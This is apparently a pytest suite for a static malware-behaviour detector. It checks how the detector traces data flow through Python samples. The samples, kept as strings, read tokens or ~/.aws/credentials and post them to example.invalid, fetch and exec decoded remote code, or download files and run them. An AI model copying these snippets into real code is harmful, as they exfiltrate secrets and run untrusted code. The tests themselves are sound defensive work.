import malir.extractor as extractor_module
from malir.detector import decide
from malir.extractor import ExtractorLimits, PythonExtractor


def analyze(source: str):
    return PythonExtractor().analyze_source(source, "sample.py")


def paths(result, motif: str):
    return [item for item in result.behavior_paths if item.motif == motif]


def event_operations(result, path):
    return [result.events[index].op for index in path.event_indexes]


def test_direct_assignment_chain_is_exact_dataflow():
    result = analyze(
        """
import base64
import os
import requests

secret = os.getenv("TOKEN")
normalized = secret.strip().encode()
payload = base64.b64encode(normalized)
requests.post("https://example.invalid", data=payload)
"""
    )
    flow = paths(result, "credential_or_file_exfil")
    assert len(flow) == 1
    assert flow[0].evidence_kind == "dataflow"
    assert flow[0].confidence == "high"
    assert event_operations(result, flow[0]) == [
        "ENV_READ",
        "ENCODE",
        "NETWORK_SEND",
    ]


def test_unrelated_constant_payload_is_only_weak_proximity():
    result = analyze(
        """
import os
import requests

secret = os.getenv("TOKEN")
requests.post("https://example.invalid", data={"status": "ok"})
"""
    )
    flow = paths(result, "credential_or_file_exfil")
    assert len(flow) == 1
    assert flow[0].evidence_kind == "proximity"
    assert flow[0].score == 2.0
    assert decide([result]).verdict == "low-signal"


def test_reassignment_kills_previous_provenance():
    result = analyze(
        """
import os
import requests

payload = os.getenv("TOKEN")
payload = "public health status"
requests.post("https://example.invalid", data=payload)
"""
    )
    assert not any(
        item.evidence_kind == "dataflow"
        for item in paths(result, "credential_or_file_exfil")
    )
    assert decide([result]).risk_score < 25


def test_url_provenance_is_not_mistaken_for_uploaded_data():
    result = analyze(
        """
import os
import requests

url = os.getenv("SERVICE_URL")
requests.post(url, data="health=ok")
"""
    )
    assert not any(
        item.evidence_kind == "dataflow"
        for item in paths(result, "credential_or_file_exfil")
    )


def test_conservative_branch_join_preserves_possible_flow():
    result = analyze(
        """
import os
import requests

if enabled:
    payload = os.getenv("TOKEN")
else:
    payload = "public"
requests.post("https://example.invalid", data=payload)
"""
    )
    assert paths(result, "credential_or_file_exfil")[0].evidence_kind == "dataflow"


def test_remote_decode_to_exec_emits_two_exact_paths():
    result = analyze(
        """
import base64
import requests

blob = requests.get("https://example.invalid/stage").content
decoded = base64.b64decode(blob)
exec(decoded)
"""
    )
    download = paths(result, "download_execute")
    encoded = paths(result, "encoded_execution")
    assert download[0].evidence_kind == "dataflow"
    assert encoded[0].evidence_kind == "dataflow"
    assert event_operations(result, download[0]) == [
        "NETWORK_RECEIVE",
        "DECODE",
        "DYNAMIC_EXEC",
    ]
    assert event_operations(result, encoded[0]) == ["DECODE", "DYNAMIC_EXEC"]


def test_nested_sensitive_open_read_preserves_original_provenance():
    result = analyze(
        """
import requests
payload = open("~/.aws/credentials").read()
requests.post("https://example.invalid", data=payload)
"""
    )
    flow = paths(result, "credential_or_file_exfil")
    assert len(flow) == 1
    assert flow[0].evidence_kind == "dataflow"
    assert event_operations(result, flow[0]) == [
        "SENSITIVE_FILE_READ",
        "SENSITIVE_FILE_READ",
        "NETWORK_SEND",
    ]


def test_nested_network_read_preserves_remote_provenance():
    result = analyze(
        """
from urllib.request import urlopen
payload = urlopen("https://example.invalid/stage").read()
exec(payload)
"""
    )
    flow = paths(result, "download_execute")
    assert flow[0].evidence_kind == "dataflow"
    assert event_operations(result, flow[0]) == [
        "NETWORK_RECEIVE",
        "FILE_READ",
        "DYNAMIC_EXEC",
    ]


def test_unknown_local_transform_conservatively_propagates_input():
    result = analyze(
        """
import os
import requests

secret = os.getenv("TOKEN")
payload = normalize_for_transport(secret)
requests.post("https://example.invalid", json={"value": payload})
"""
    )
    assert paths(result, "credential_or_file_exfil")[0].evidence_kind == "dataflow"


def test_callable_boundary_prevents_accidental_cross_function_flow():
    result = analyze(
        """
import os
import requests

secret = os.getenv("TOKEN")

def send_status():
    requests.post("https://example.invalid", data=secret)
"""
    )
    assert paths(result, "credential_or_file_exfil") == []


def test_structural_motifs_are_not_labeled_dataflow():
    result = analyze(
        """
def configure():
    open(".bashrc", "w").write("alias ll='ls -la'")
"""
    )
    persistence = paths(result, "persistence_write")
    assert persistence[0].evidence_kind == "structural"
    assert persistence[0].confidence == "high"


def test_dataflow_can_be_disabled_for_cost_ablation():
    result = PythonExtractor(enable_dataflow=False).analyze_source(
        """
import os
import requests
payload = os.getenv("TOKEN")
requests.post("https://example.invalid", data=payload)
""",
        "sample.py",
    )
    flow = paths(result, "credential_or_file_exfil")
    assert flow[0].evidence_kind == "proximity"
    assert not any(item.evidence_kind == "dataflow" for item in flow)


def test_candidate_gate_skips_second_pass_without_a_source_sink_pair(monkeypatch):
    def unexpected_pass(*args, **kwargs):
        raise AssertionError("data-flow pass should have been gated")

    monkeypatch.setattr(
        extractor_module,
        "build_local_dataflow_paths",
        unexpected_pass,
    )
    result = analyze(
        """
from pathlib import Path
content = Path("settings.json").read_text()
print(len(content))
"""
    )
    assert result.parse_error is None
    assert result.behavior_paths == []


def test_provenance_recursion_failure_falls_back_to_proximity(monkeypatch):
    def exhausted(*args, **kwargs):
        raise RecursionError("synthetic depth limit")

    monkeypatch.setattr(extractor_module, "build_local_dataflow_paths", exhausted)
    result = analyze(
        """
import os
import requests
payload = os.getenv("TOKEN")
requests.post("https://example.invalid", data=payload)
"""
    )
    assert result.parse_error == (
        "local provenance analysis stopped: synthetic depth limit"
    )
    assert paths(result, "credential_or_file_exfil")[0].evidence_kind == "proximity"


def test_path_metadata_reaches_detector_evidence():
    decision = decide(
        [
            analyze(
                """
import os
import requests
payload = os.getenv("TOKEN")
requests.post("https://example.invalid", data=payload)
"""
            )
        ]
    )
    item = next(evidence for evidence in decision.evidence if evidence.motif)
    assert item.evidence_kind == "dataflow"
    assert item.confidence == "high"


def test_download_written_to_named_file_then_executed_is_exact_dataflow():
    result = analyze(
        """
import requests
import subprocess

def run(url, filename):
    response = requests.get(url)
    with open(filename, "wb") as handle:
        handle.write(response.content)
    subprocess.run(["python", filename])
"""
    )
    flow = paths(result, "download_execute")
    exact = [item for item in flow if item.evidence_kind == "dataflow"]
    assert len(exact) == 1
    assert event_operations(result, exact[0]) == [
        "NETWORK_RECEIVE",
        "FILE_WRITE",
        "PROCESS_EXEC",
    ]


def test_staged_file_provenance_is_killed_by_path_reassignment():
    result = analyze(
        """
import requests
import subprocess

def run(url, filename):
    response = requests.get(url)
    with open(filename, "wb") as handle:
        handle.write(response.content)
    filename = "known-safe.py"
    subprocess.run(["python", filename])
"""
    )
    assert not any(
        item.evidence_kind == "dataflow" for item in paths(result, "download_execute")
    )


def test_staged_download_does_not_taint_a_different_execution_path():
    result = analyze(
        """
import requests
import subprocess

def run(url, downloaded, local_script):
    response = requests.get(url)
    with open(downloaded, "wb") as handle:
        handle.write(response.content)
    subprocess.run(["python", local_script])
"""
    )
    assert not any(
        item.evidence_kind == "dataflow" for item in paths(result, "download_execute")
    )


def test_staged_file_chmod_is_not_mistaken_for_payload_execution():
    result = analyze(
        """
import os
import requests

def prepare(url, filename):
    response = requests.get(url)
    with open(filename, "wb") as handle:
        handle.write(response.content)
    os.system(f"chmod +x {filename}")
"""
    )
    assert not any(
        item.evidence_kind == "dataflow" for item in paths(result, "download_execute")
    )


def test_staged_file_in_shell_command_position_is_exact_execution():
    result = analyze(
        """
import os
import requests

def run(url, filename):
    response = requests.get(url)
    with open(filename, "wb") as handle:
        handle.write(response.content)
    os.system(f"./{filename} &")
"""
    )
    exact = [
        item
        for item in paths(result, "download_execute")
        if item.evidence_kind == "dataflow"
    ]
    assert len(exact) == 1


def test_staged_file_windows_start_launcher_is_exact_execution():
    result = analyze(
        """
import os
import requests

def run(url, filename):
    response = requests.get(url)
    open(filename, "wb").write(response.content)
    os.system("start " + filename)
"""
    )
    exact = [
        item
        for item in paths(result, "download_execute")
        if item.evidence_kind == "dataflow"
    ]
    assert len(exact) == 1


def test_direct_local_parameter_to_sink_uses_bounded_summary():
    result = analyze(
        """
import os
import requests

def transmit(payload):
    requests.post("https://example.invalid", data=payload)

secret = os.getenv("TOKEN")
transmit(secret)
"""
    )
    flow = paths(result, "credential_or_file_exfil")
    summary = [item for item in flow if item.evidence_kind == "summary"]
    assert len(summary) == 1
    assert summary[0].confidence == "medium"
    assert event_operations(result, summary[0]) == [
        "ENV_READ",
        "NETWORK_SEND",
    ]


def test_direct_local_return_propagates_source_to_caller():
    result = analyze(
        """
import os
import requests

def read_secret():
    return os.getenv("TOKEN")

requests.post("https://example.invalid", data=read_secret())
"""
    )
    flow = paths(result, "credential_or_file_exfil")
    summary = [item for item in flow if item.evidence_kind == "summary"]
    assert len(summary) == 1
    assert event_operations(result, summary[0]) == [
        "ENV_READ",
        "NETWORK_SEND",
    ]


def test_direct_local_transform_summary_keeps_transform_event():
    result = analyze(
        """
import base64
import os
import requests

def pack(value):
    return base64.b64encode(value.encode())

secret = os.getenv("TOKEN")
requests.post("https://example.invalid", data=pack(secret))
"""
    )
    summary = [
        item
        for item in paths(result, "credential_or_file_exfil")
        if item.evidence_kind == "summary"
    ]
    assert len(summary) == 1
    assert event_operations(result, summary[0]) == [
        "ENV_READ",
        "ENCODE",
        "NETWORK_SEND",
    ]


def test_known_local_constant_return_kills_argument_provenance():
    result = analyze(
        """
import os
import requests

def public_status(_secret):
    return "healthy"

secret = os.getenv("TOKEN")
requests.post(
    "https://example.invalid",
    data=public_status(secret),
)
"""
    )
    assert not any(
        item.evidence_kind in {"dataflow", "summary"}
        for item in paths(result, "credential_or_file_exfil")
    )


def test_direct_call_summary_binds_keyword_arguments():
    result = analyze(
        """
import os
import requests

def transmit(*, payload):
    requests.post("https://example.invalid", json=payload)

secret = os.getenv("TOKEN")
transmit(payload=secret)
"""
    )
    summary = [
        item
        for item in paths(result, "credential_or_file_exfil")
        if item.evidence_kind == "summary"
    ]
    assert len(summary) == 1


def test_function_parameter_does_not_resolve_to_shadowed_module_helper():
    result = analyze(
        """
import os
import requests

def transmit(payload):
    requests.post("https://example.invalid", data=payload)

def wrapper(transmit, value):
    transmit(value)
    return "healthy"

secret = os.getenv("TOKEN")
requests.post(
    "https://example.invalid",
    data=wrapper(lambda _value: "healthy", secret),
)
"""
    )
    assert not any(
        item.evidence_kind == "summary"
        for item in paths(result, "credential_or_file_exfil")
    )


def test_recursive_direct_call_is_bounded_and_conservative():
    result = analyze(
        """
import os
import requests

def first(value):
    return second(value)

def second(value):
    return first(value)

secret = os.getenv("TOKEN")
requests.post("https://example.invalid", data=first(secret))
"""
    )
    summary = [
        item
        for item in paths(result, "credential_or_file_exfil")
        if item.evidence_kind == "summary"
    ]
    assert len(summary) == 1


def test_direct_call_expansion_can_be_disabled_with_zero_depth():
    result = PythonExtractor(
        limits=ExtractorLimits(max_call_depth=0),
    ).analyze_source(
        """
import os
import requests

def transmit(payload):
    requests.post("https://example.invalid", data=payload)

secret = os.getenv("TOKEN")
transmit(secret)
""",
        "sample.py",
    )
    assert not any(
        item.evidence_kind == "summary"
        for item in paths(result, "credential_or_file_exfil")
    )


def test_zero_depth_does_not_label_unknown_return_passthrough_as_summary():
    result = PythonExtractor(
        limits=ExtractorLimits(max_call_depth=0),
    ).analyze_source(
        """
import os
import requests

def identity(value):
    return value

secret = os.getenv("TOKEN")
requests.post("https://example.invalid", data=identity(secret))
""",
        "sample.py",
    )
    flow = paths(result, "credential_or_file_exfil")
    assert any(item.evidence_kind == "dataflow" for item in flow)
    assert not any(item.evidence_kind == "summary" for item in flow)


def test_lexical_local_binding_does_not_resolve_to_module_helper():
    result = analyze(
        """
import os
import requests

def transmit(payload):
    requests.post("https://example.invalid", data=payload)

def wrapper(value):
    transmit(value)
    transmit = lambda _value: "healthy"

wrapper(os.getenv("TOKEN"))
"""
    )
    assert not any(
        item.evidence_kind in {"dataflow", "summary"}
        for item in paths(result, "credential_or_file_exfil")
    )


def test_awaited_async_direct_call_uses_summary():
    result = analyze(
        """
import os
import requests

async def transmit(payload):
    requests.post("https://example.invalid", data=payload)

async def main():
    secret = os.getenv("TOKEN")
    await transmit(secret)
"""
    )
    summary = [
        item
        for item in paths(result, "credential_or_file_exfil")
        if item.evidence_kind == "summary"
    ]
    assert len(summary) == 1


def test_unawaited_async_call_does_not_execute_callee_body():
    result = analyze(
        """
import os
import requests

async def transmit(payload):
    requests.post("https://example.invalid", data=payload)

def main():
    secret = os.getenv("TOKEN")
    transmit(secret)
"""
    )
    assert not any(
        item.evidence_kind in {"dataflow", "summary"}
        for item in paths(result, "credential_or_file_exfil")
    )


def test_generator_call_does_not_execute_callee_body():
    result = analyze(
        """
import os
import requests

def transmit(payload):
    yield requests.post("https://example.invalid", data=payload)

transmit(os.getenv("TOKEN"))
"""
    )
    assert not any(
        item.evidence_kind in {"dataflow", "summary"}
        for item in paths(result, "credential_or_file_exfil")
    )


def test_rebound_module_function_is_not_expanded():
    result = analyze(
        """
import os
import requests

def transmit(payload):
    requests.post("https://example.invalid", data=payload)

transmit = lambda _value: "healthy"

def wrapper(value):
    transmit(value)

wrapper(os.getenv("TOKEN"))
"""
    )
    assert not any(
        item.evidence_kind in {"dataflow", "summary"}
        for item in paths(result, "credential_or_file_exfil")
    )


def test_duplicate_module_definitions_are_not_guessed():
    result = analyze(
        """
import os
import requests

def transmit(_payload):
    return "healthy"

def wrapper(value):
    transmit(value)

wrapper(os.getenv("TOKEN"))

def transmit(payload):
    requests.post("https://example.invalid", data=payload)
"""
    )
    assert not any(
        item.evidence_kind in {"dataflow", "summary"}
        for item in paths(result, "credential_or_file_exfil")
    )


def test_direct_call_summary_binds_positional_only_argument():
    result = analyze(
        """
import os
import requests

def transmit(payload, /):
    requests.post("https://example.invalid", data=payload)

transmit(os.getenv("TOKEN"))
"""
    )
    assert any(
        item.evidence_kind == "summary"
        for item in paths(result, "credential_or_file_exfil")
    )


def test_positional_only_parameter_is_not_bound_from_keyword():
    result = analyze(
        """
import os
import requests

def transmit(payload, /):
    requests.post("https://example.invalid", data=payload)

transmit(payload=os.getenv("TOKEN"))
"""
    )
    assert not any(
        item.evidence_kind in {"dataflow", "summary"}
        for item in paths(result, "credential_or_file_exfil")
    )


def test_direct_call_summary_uses_positional_default_provenance():
    result = analyze(
        """
import os
import requests

def transmit(payload=os.getenv("TOKEN")):
    requests.post("https://example.invalid", data=payload)

transmit()
"""
    )
    summary = [
        item
        for item in paths(result, "credential_or_file_exfil")
        if item.evidence_kind == "summary"
    ]
    assert len(summary) == 1
    assert event_operations(result, summary[0]) == [
        "ENV_READ",
        "NETWORK_SEND",
    ]


def test_direct_call_summary_uses_keyword_only_default_provenance():
    result = analyze(
        """
import os
import requests

def transmit(*, payload=os.getenv("TOKEN")):
    requests.post("https://example.invalid", json=payload)

transmit()
"""
    )
    summary = [
        item
        for item in paths(result, "credential_or_file_exfil")
        if item.evidence_kind == "summary"
    ]
    assert len(summary) == 1


def test_explicit_constant_argument_overrides_source_default():
    result = analyze(
        """
import os
import requests

def transmit(payload=os.getenv("TOKEN")):
    requests.post("https://example.invalid", data=payload)

transmit("public status")
"""
    )
    assert not any(
        item.evidence_kind in {"dataflow", "summary"}
        for item in paths(result, "credential_or_file_exfil")
    )
